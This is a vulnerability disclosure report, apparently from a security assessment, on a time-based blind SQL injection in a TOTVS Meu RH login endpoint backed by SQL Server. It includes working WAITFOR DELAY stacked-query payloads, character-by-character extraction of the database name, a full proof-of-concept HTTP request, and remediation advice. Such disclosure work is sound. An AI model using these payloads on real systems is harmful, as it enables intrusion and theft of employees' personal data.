Severity: 🔴 Critical (CVSS 9.1)
Confidence: Confirmed
CWE: CWE-89
OWASP: A03:2021 — Injection

Description

The /rest/auth/login authentication endpoint on the REST API (port 9197) is vulnerable to time-based blind SQL Injection using stacked queries via the user JSON parameter. The backend is Microsoft SQL Server 2022 and allows arbitrary SQL command execution through the WAITFOR DELAY statement.

The WAF protecting the application blocks XSS and XXE attacks but does not block SQL injection payloads.

Evidence
1. Delay Confirmation (Stacked Queries Enabled)
Payload in user Parameter	Response Time	Interpretation
test (baseline, no payload)	~0.85s	Normal response
test');WAITFOR DELAY '0:0:3'--	~3.98s	Delay confirmed
test');WAITFOR DELAY '0:0:5'--	~5.98s	Delay confirmed
test');WAITFOR DELAY '0:0:8'--	~8.82s	Delay confirmed

The response time scales linearly with the specified delay, demonstrating that the injected SQL statement is executed directly by Microsoft SQL Server.

2. Confirmed Data Extraction (DB_NAME)
Payload	Result
test');IF ASCII(SUBSTRING(DB_NAME(),1,1))=80 WAITFOR DELAY '0:0:3'--	Delay → DB_NAME()[1] = P
test');IF ASCII(SUBSTRING(DB_NAME(),2,1))<=82 WAITFOR DELAY '0:0:10'--	Delay → DB_NAME()[2] = R

The first two characters of the database name were successfully extracted: PR...

Original Request
POST /rest/auth/login HTTP/1.1
Host: meurh.host:9197
Content-Type: application/json
X-Totvs-App: 0200

{
  "user":"test",
  "password":"test",
  "redirectUrl":"https://meurh.host/",
  "restUrl":"https://meurh.host:9197/rest"
}
Malicious Request (Proof of Concept)
POST /rest/auth/login HTTP/1.1
Host: meurh.host:9197
Content-Type: application/json
X-Totvs-App: 0200

{
  "user":"test');IF ASCII(SUBSTRING(DB_NAME(),1,1))=80 WAITFOR DELAY '0:0:3'--",
  "password":"test",
  "redirectUrl":"https://meurh.host/",
  "restUrl":"https://meurh.host:9197/rest"
}
Technical Details
Vulnerability Type: Blind Time-Based SQL Injection (Inferential)
Extraction Method: Binary search on ASCII values using conditional IF statements combined with WAITFOR DELAY
Stacked Queries: Confirmed (multiple SQL statements separated by ;)
WAF Bypass: The WAF does not block SQL injection payloads. Only XSS and XXE payloads result in HTTP 403 responses.
Technical Impact

An unauthenticated attacker can:

Extract the entire database schema, including DB_NAME(), SYSTEM_USER, and table listings via INFORMATION_SCHEMA.
Retrieve sensitive HR data, including employee records, salaries, payroll information, personal documents, application users, and password hashes.
Execute operating system commands if xp_cmdshell is enabled.
Modify database contents using INSERT, UPDATE, and DELETE statements through stacked queries.
Create administrative users within the TOTVS Meu RH application.
Business Impact
Government-funded scientific research institution.
Exposure of personal data belonging to all employees, potentially resulting in violations of Brazil's General Data Protection Law (LGPD).
Complete compromise of the confidentiality, integrity, and availability of the Human Resources system.
Remediation
Use prepared statements with parameter binding. Never concatenate user input into SQL queries.
Implement parameterized stored procedures for all database operations.
Apply the principle of least privilege. The database account used by the application should not have permissions that allow execution of stacked queries or unnecessary SQL commands.
Configure the WAF to detect and block SQL injection patterns, including WAITFOR, SLEEP, BENCHMARK, and stacked query delimiters (;).
Enable SQL Server audit logging to detect anomalous or malicious SQL queries.
References
OWASP SQL Injection Prevention Cheat Sheet
CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
Microsoft SQL Server SQL Injection Cheat Sheet

Impact: Full database data extraction (DB_NAME, SYSTEM_USER, tables, employee data) via time-based blind injection. Extraction script created and tested.
